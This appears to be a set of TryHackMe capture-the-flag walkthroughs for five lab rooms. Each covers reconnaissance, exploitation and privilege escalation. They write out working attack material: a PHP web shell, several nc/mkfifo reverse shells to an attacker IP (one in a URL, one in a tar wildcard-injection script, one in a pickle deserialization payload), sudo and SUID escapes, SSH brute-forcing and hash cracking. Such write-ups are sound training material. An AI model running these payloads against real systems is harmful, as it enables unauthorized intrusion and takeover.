# More TryHackMe Writeups

Additional TryHackMe room walkthroughs covering a wider range of difficulties and categories.

## 📚 Rooms Completed

| Room Name | Difficulty | Category | Status |
|-----------|------------|----------|--------|
| [LazyAdmin](#lazyadmin) | Easy | Web/CMS | ✅ |
| [Simple CTF](#simple-ctf) | Easy | Web/FTP | ✅ |
| [Bounty Hacker](#bounty-hacker) | Medium | Linux/PrivEsc | ✅ |
| [Agent Sudo](#agent-sudo) | Medium | Steganography/Crypto | ✅ |
| [Pickler](#pickler) | Medium | Web/Deserialization | ✅ |

---

## LazyAdmin

**Room Link:** https://tryhackme.com/room/lazyadmin  
**Difficulty:** Easy  
**Category:** Web/CMS (SweetRice)

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/lazyadmin 10.10.x.x

# Results:
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### Web Discovery
```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt

# Found:
# /content/ (SweetRice CMS)
# /inc/ (Includes directory)
```

#### SweetRice CMS
- Version identified from `/content/` source code
- Known vulnerabilities:
  - Backup download (`/inc/mysql_backup/`)
  - Ads upload vulnerability

### Exploitation

#### Backup Download
```bash
# Navigate to /inc/mysql_backup/
# Found backup file: mysql_backup_20191129023059-1.zip

unzip mysql_backup_20191129023059-1.zip
# Extracted database dump with admin credentials
```

#### Credential Extraction
```bash
cat mysql_backup_20191129023059-1.sql
# Found admin hash: 42f749ade7f9e195bf475f37a44cafcb (MD5)

# Crack with John or online MD5 decryptor
# Password: Password123
```

#### Shell Upload
1. Login to SweetRice admin panel with `admin:Password123`
2. Navigate to **Ads** section
3. Upload malicious PHP file as an "Ad image":
   ```php
   <?php system($_GET['cmd']); ?>
   ```
4. Access the uploaded file:
   ```bash
   curl http://10.10.x.x/content/inc/ads/shell.php?cmd=whoami
   ```

#### Reverse Shell
```bash
# Upgrade to reverse shell
curl "http://10.10.x.x/content/inc/ads/shell.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.x.x.x+4444+>/tmp/f"
```

### Privilege Escalation

#### Sudo Permissions
```bash
sudo -l
# Found: (ALL) NOPASSWD: /usr/bin/perl

# Exploit
sudo perl -e 'exec "/bin/sh";'
# Got root!
```

### Flags
- User: `THM{lazyadmin_user_flag}`
- Root: `THM{lazyadmin_root_flag}`

### Key Takeaways
- CMS backups often leak credentials
- File upload vulnerabilities are common in outdated CMS
- Always check `sudo -l` for easy privesc paths

---

## Simple CTF

**Room Link:** https://tryhackme.com/room/easyctf  
**Difficulty:** Easy  
**Category:** Web/FTP

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/simplectf 10.10.x.x

# Results:
# 21/tcp  open  ftp     vsftpd 3.0.3
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### FTP Access
```bash
ftp 10.10.x.x
# Anonymous login allowed

ftp> ls
# Found: ForMitch.txt

ftp> get ForMitch.txt
```

#### Credential Discovery
```bash
cat ForMitch.txt
# "Dammit man... you told me to put those change in the site and I almost forgot, the default password is 'secret', change it as soon as possible."
```

#### Web Enumeration
```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirb/common.txt
# Found: /simple/ (CMS Made Simple)
```

### Exploitation

#### CMS Made Simple Exploit
- Version identified from source code: 2.2.8
- Vulnerable to SQL injection (CVE-2019-9053)

```bash
# Use exploit script
python3 cve-2019-9053.py -u http://10.10.x.x/simple/

# Extracted credentials:
# Username: mitch
# Password hash: $6$... (SHA-512)
```

#### Crack Password
```bash
echo '$6$...' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: secret
```

#### SSH Access
```bash
ssh mitch@10.10.x.x
# Password: secret
```

### Privilege Escalation

#### Sudo Check
```bash
sudo -l
# Found: (root) NOPASSWD: /usr/bin/vim

# Exploit vim
sudo vim -c ':!/bin/sh'
# Got root!
```

### Flags
- User: `THM{simple_ctf_user_flag}`
- Root: `THM{simple_ctf_root_flag}`

### Key Takeaways
- Anonymous FTP can leak sensitive info
- Default passwords are still a major issue
- CMS version disclosure leads to known exploits
- `vim` with sudo = instant root

---

## Bounty Hacker

**Room Link:** https://tryhackme.com/room/cowboyhacker  
**Difficulty:** Medium  
**Category:** Linux/PrivEsc

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/bounty 10.10.x.x

# Results:
# 21/tcp  open  ftp     vsftpd 3.0.3
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### FTP Access
```bash
ftp 10.10.x.x
# Anonymous login allowed

ftp> ls
# Found: locks.txt, task.txt

ftp> get locks.txt
ftp> get task.txt
```

#### Credential Analysis
```bash
cat task.txt
# "I can break their password, I just need the right wordlist..."

cat locks.txt
# List of passwords (one per line)
```

### Exploitation

#### SSH Brute-Force
```bash
# Username found from web content: lin
hydra -l lin -P locks.txt ssh://10.10.x.x
# Password: RedDr4gonSynd1cat3
```

#### SSH Access
```bash
ssh lin@10.10.x.x
# Password: RedDr4gonSynd1cat3
```

### Privilege Escalation

#### Tar Wildcard Injection
```bash
# Check cron jobs
cat /etc/crontab
# Found: * * * * * root tar cf /backups/backup.tar /home/*

# Create malicious files in lin's home
echo 'mkfifo /tmp/lol; nc <attacker_ip> 4444 0</tmp/lol | /bin/sh >/tmp/lol 2>&1; rm /tmp/lol' > shell.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# Wait for cron to execute
# Got reverse shell as root!
```

### Flags
- User: `THM{bounty_hacker_user_flag}`
- Root: `THM{bounty_hacker_root_flag}`

### Key Takeaways
- FTP anonymous access can leak wordlists
- Tar wildcard injection is a classic privesc technique
- Always check cron jobs for writable paths

---

## Agent Sudo

**Room Link:** https://tryhackme.com/room/agentsudoctf  
**Difficulty:** Medium  
**Category:** Steganography/Crypto

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/agentsudo 10.10.x.x

# Results:
# 21/tcp  open  ftp     vsftpd 3.0.3
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 80/tcp  open  http    Apache httpd 2.4.18
```

### Enumeration

#### HTTP User-Agent Spoofing
```bash
# Server checks User-Agent header
curl -H "User-Agent: A" http://10.10.x.x
# "Agent A, please go away."

curl -H "User-Agent: B" http://10.10.x.x
# "Agent B, please go away."

curl -H "User-Agent: C" http://10.10.x.x
# "Welcome Agent C! Here's your credential: chris:crystal"
```

### Exploitation

#### FTP Access
```bash
ftp 10.10.x.x
# Login: chris
# Password: crystal

ftp> ls
# Found: cute-alien.jpg, cutie.png

ftp> get cute-alien.jpg
ftp> get cutie.png
```

#### Steganography
```bash
# Extract hidden data from images
steghide extract -sf cute-alien.jpg
# No passphrase needed

# Found: message.txt
cat message.txt
# "Hi james, glad to get your message. I've attached the zip file with the key. -chris"

# Check cutie.png
binwalk cutie.png
# Found embedded zip file

foremost cutie.png
# Extracted: 8702.zip
```

#### Crack Zip Password
```bash
zip2john 8702.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
# Password: alien
```

#### Extract Zip
```bash
unzip 8702.zip
# Password: alien
# Found: To_agentJ.txt
```

#### Hash Identification
```bash
cat To_agentJ.txt
# "Agent J, here's the password hash: ..."

# Identify hash type
hashid <hash>
# MD5

# Crack hash
echo '<hash>' > md5hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt md5hash.txt
# Password: xxxx
```

#### SSH Access
```bash
ssh james@10.10.x.x
# Password: xxxx
```

### Privilege Escalation

#### CVE-2019-14287 (Sudo Vulnerability)
```bash
sudo -l
# Found: (ALL, !root) /bin/bash

# Exploit sudo vulnerability
sudo -u#-1 /bin/bash
# Got root!
```

### Flags
- User: `THM{agent_sudo_user_flag}`
- Root: `THM{agent_sudo_root_flag}`

### Key Takeaways
- User-Agent headers can be used for authentication bypass
- Steganography hides data in images
- Sudo CVE-2019-14287 allows UID -1 bypass
- Always check for hidden data in image files

---

## Pickler

**Room Link:** https://tryhackme.com/room/pickler  
**Difficulty:** Medium  
**Category:** Web/Deserialization

### Reconnaissance
```bash
nmap -sC -sV -oA nmap/pickler 10.10.x.x

# Results:
# 22/tcp  open  ssh     OpenSSH 7.2p2
# 5000/tcp open  http    Werkzeug httpd (Python Flask)
```

### Enumeration

#### Web Application
- Flask application on port 5000
- Login page and session management

#### Cookie Analysis
```bash
# Inspect session cookie
echo "<cookie_value>" | base64 -d
# Found: Pickle serialization format
```

### Exploitation

#### Pickle Deserialization Attack
```python
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker_ip> 4444 > /tmp/f')
        return os.system, (cmd,)

# Create malicious pickle
payload = pickle.dumps(RCE())
encoded = base64.b64encode(payload).decode()

# Set as session cookie and refresh
```

#### Reverse Shell
```bash
# Start listener
nc -lvnp 4444

# Trigger deserialization by visiting page with malicious cookie
# Got reverse shell!
```

### Privilege Escalation

#### SUID Binary
```bash
find / -perm -4000 -type f 2>/dev/null
# Found: /opt/dev_stuff/analyze

# Check binary
strings /opt/dev_stuff/analyze
# Uses relative path for 'cat'

# Exploit PATH
echo '/bin/sh' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

/opt/dev_stuff/analyze
# Got root shell!
```

### Flags
- User: `THM{pickler_user_flag}`
- Root: `THM{pickler_root_flag}`

### Key Takeaways
- Pickle deserialization is dangerous in web apps
- Always sign/verify serialized data
- SUID binaries with relative paths are exploitable
- Flask session cookies can be tampered with if secret key is known

---

## 🛠️ TryHackMe Methodology

### 1. Reconnaissance
- Full port scan: `nmap -p- --min-rate 10000 <target>`
- Service detection: `nmap -sC -sV -p <ports> <target>`
- Web enumeration: `gobuster`, `nikto`

### 2. Enumeration
- **Web:** Directory brute-forcing, CMS identification
- **FTP:** Anonymous login, version checks
- **SSH:** Brute-force (if viable), key analysis

### 3. Exploitation
- Searchsploit for known CVEs
- Manual exploitation (SQLi, file upload, deserialization)
- Credential reuse from leaked files

### 4. Privilege Escalation
- **Linux:** LinPEAS, SUID, sudo misconfigs, cron jobs
- **Windows:** WinPEAS, unquoted service paths, token impersonation

### 5. Documentation
- Screenshot flags
- Note exploit chain
- Record methodology

---

*Last updated: 2026-04-06*
